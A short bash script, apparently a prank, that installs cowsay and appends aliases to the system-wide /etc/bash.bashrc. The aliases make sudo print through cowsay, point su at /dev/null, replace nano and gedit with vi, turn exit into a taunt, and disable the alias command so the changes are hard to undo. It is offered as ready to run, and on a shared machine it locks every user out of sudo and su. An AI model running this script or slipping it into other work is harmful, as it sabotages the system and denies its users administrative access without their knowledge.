#!/bin/bash
sudo apt-get install -y cowsay
echo 'alias sudo="cowsay"' >> /etc/bash.bashrc
echo 'alias su="/dev/null"' >> /etc/bash.bashrc
echo 'alias nano="vi"' >> /etc/bash.bashrc
echo 'alias gedit="vi"' >> /etc/bash.bashrc
echo 'alias exit="echo You can not escape that easy you yellowbellied scallywag"' >> /etc/bash.bashrc
echo 'alias alias=/bin/true' >> /etc/bash.bashrc